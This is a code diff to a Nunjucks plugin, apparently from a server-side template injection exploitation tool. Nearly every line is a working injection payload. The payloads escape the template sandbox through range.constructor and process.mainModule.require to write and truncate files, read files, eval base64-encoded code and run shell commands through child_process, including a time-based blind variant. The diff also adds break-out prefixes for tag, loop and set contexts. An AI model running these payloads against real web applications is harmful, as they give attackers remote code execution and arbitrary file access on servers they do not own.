@@ -16,24 +16,24 @@ class Nunjucks(Plugin):
         },
         'write' : {
             'call' : 'inject',
-            'write' : """{{range.constructor("require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')")}}""",
-            'truncate' : """{{range.constructor("require('fs').writeFileSync('%(path)s', '')")}}"""
+            'write' : """{{range.constructor("global.process.mainModule.require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')")()}}""",
+            'truncate' : """{{range.constructor("global.process.mainModule.require('fs').writeFileSync('%(path)s', '')")()}}"""
         },
         'read' : {
             'call': 'evaluate',
-            'read' : """require('fs').readFileSync('%(path)s').toString('base64')"""
+            'read' : """global.process.mainModule.require('fs').readFileSync('%(path)s').toString('base64')"""
         },
         'md5' : {
             'call': 'evaluate',
-            'md5': """require('crypto').createHash('md5').update(require('fs').readFileSync('%(path)s')).digest("hex")"""
+            'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('%(path)s')).digest("hex")"""
         },
         'evaluate' : {
             'call': 'render',
-            'evaluate' : """{{range.constructor("eval(Buffer('%(code_b64)s', 'base64').toString())")()}}""",
+            'evaluate' : """{{range.constructor("return eval(Buffer('%(code_b64)s', 'base64').toString())")()}}""",
         },
         'execute' : {
             'call': 'evaluate',
-            'execute': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
+            'execute': """global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString())"""
         },
         'blind' : {
             'call': 'execute_blind',
@@ -50,7 +50,7 @@ class Nunjucks(Plugin):
         },
         'execute_blind' : {
             'call': 'inject',
-            'execute_blind': """{{range.constructor("require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i'")}}"""
+            'execute_blind': """{{range.constructor("global.process.mainModule.require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i')")()}}"""
         },
     }
 
@@ -59,16 +59,12 @@ class Nunjucks(Plugin):
         # Text context, no closures
         { 'level': 0 },
 
-        # This covers {{%s}}
-        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
+        { 'level': 1, 'prefix': '%(closure)s}}', 'suffix' : '{{1', 'closures' : languages.javascript_ctx_closures },
+        { 'level': 1, 'prefix': '%(closure)s %%}', 'suffix' : '', 'closures' : languages.javascript_ctx_closures },
+        { 'level': 5, 'prefix': '%(closure)s %%}{%% endfor %%}{%% for a in [1] %%}', 'suffix' : '', 'closures' : languages.javascript_ctx_closures },
 
-        # This covers {% %s %}
-        { 'level': 1, 'prefix': '%(closure)s%%}', 'suffix' : '', 'closures' : languages.python_ctx_closures },
-
-        # If and for blocks
-        # # if %s:\n# endif
-        # # for a in %s:\n# endfor
-        { 'level': 5, 'prefix': '%(closure)s\n', 'suffix' : '\n', 'closures' : languages.python_ctx_closures },
+        # This escapes string {% set %s = 1 %}
+        { 'level': 5, 'prefix': '%(closure)s = 1 %%}', 'suffix' : '', 'closures' : languages.javascript_ctx_closures },
 
         # Comment blocks
         { 'level': 5, 'prefix' : '#}', 'suffix' : '{#' },
